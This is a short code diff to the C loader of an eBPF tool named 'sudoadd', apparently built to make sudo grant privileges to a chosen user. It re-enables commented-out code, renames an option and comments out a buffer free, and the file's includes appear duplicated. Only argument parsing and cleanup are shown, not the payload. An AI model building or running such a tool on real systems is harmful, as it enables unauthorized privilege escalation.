@@ -1,4 +1,4 @@
-/*#include <argp.h>
+#include <argp.h>
 #include <unistd.h>
 #include "sudoadd.skel.h"
 #include "common.h"
@@ -31,7 +31,7 @@ const char argp_program_doc[] =
 "USAGE: ./sudoadd -u username [-t 1111] [-r uid]\n";
 
 static const struct argp_option opts[] = {
-    {"Username", 'u', "USERNAME", 0, "username of user to "},
+    {"username", 'u', "USERNAME", 0, "username of user to "},
     {"restrict", 'r', NULL, 0, "restrict to only run when sudo is executed by the matching user "},
     {"target_ppid", 't', "PPID", 0, "Optional Parent PID, will only affect its children. "},
     {},
@@ -161,10 +161,10 @@ int main(int argc, char **argv) {
         }
     }
 cleanup:
-    ring_buffer__free(rb);
+    //ring_buffer__free(rb);
     sudoadd__destroy(skel);
     return -err;
-}*/
+}
 
 #include <argp.h>
 #include <unistd.h>
